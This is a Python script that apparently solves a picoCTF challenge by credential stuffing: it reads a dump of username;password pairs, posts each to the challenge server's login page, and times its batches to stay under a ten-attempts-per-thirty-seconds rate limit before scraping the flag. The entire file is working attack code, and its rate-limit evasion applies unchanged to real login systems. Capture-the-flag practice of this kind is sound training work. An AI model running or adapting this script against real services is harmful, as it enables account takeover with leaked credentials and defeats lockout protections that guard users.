#!/usr/bin/env python3

import re
import sys
import time
from pathlib import Path
from urllib.parse import urljoin

import requests


BASE_URL = "http://candy-mountain.picoctf.net:65458/"
LOGIN_URL = urljoin(BASE_URL, "login")
HOME_URL = urljoin(BASE_URL, "")
CREDS_PATH = Path(__file__).with_name("creds-dump.txt")
MAX_ATTEMPTS_PER_EPOCH = 10
EPOCH_DURATION = 30
EPOCH_BUFFER = 1.0


def load_credentials(path: Path) -> list[tuple[int, str, str]]:
    credentials = []
    with path.open("r", encoding="utf-8") as handle:
        for index, line in enumerate(handle, start=1):
            username, password = line.rstrip("\n").split(";", 1)
            credentials.append((index, username, password))
    return credentials


def extract_flag(text: str) -> str | None:
    match = re.search(r"picoCTF\{[^}]+\}", text)
    if match:
        return match.group(0)
    return None


def main() -> int:
    credentials = load_credentials(CREDS_PATH)
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"

    epoch_start = None
    attempts_in_epoch = 0

    for index, username, password in credentials:
        if attempts_in_epoch == MAX_ATTEMPTS_PER_EPOCH:
            assert epoch_start is not None
            elapsed = time.time() - epoch_start
            sleep_for = max(0.0, EPOCH_DURATION + EPOCH_BUFFER - elapsed)
            print(f"[+] Waiting {sleep_for:.1f}s for the rate-limit epoch to reset", flush=True)
            time.sleep(sleep_for)
            epoch_start = None
            attempts_in_epoch = 0

        if epoch_start is None:
            epoch_start = time.time()

        attempts_in_epoch += 1
        response = session.post(
            LOGIN_URL,
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=10,
        )

        print(f"[*] Attempt {index:02d}: {username};{password} -> {response.status_code}", flush=True)

        if "Rate Limited Exceeded" in response.text:
            print("[-] Hit the lockout unexpectedly; wait longer before the next batch.", file=sys.stderr)
            return 1

        if response.status_code == 302 and response.headers.get("Location") == "/":
            home = session.get(HOME_URL, timeout=10)
            flag = extract_flag(home.text)
            print(f"[+] Valid credential found: {username};{password}")
            if flag:
                print(f"[+] Flag: {flag}")
                return 0

            print("[+] Logged in but could not extract the flag automatically.")
            print(home.text)
            return 0

        if "Invalid username or password." not in response.text:
            print("[?] Received an unexpected response body:")
            print(response.text)
            return 1

    print("[-] No valid credential found in the dump.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
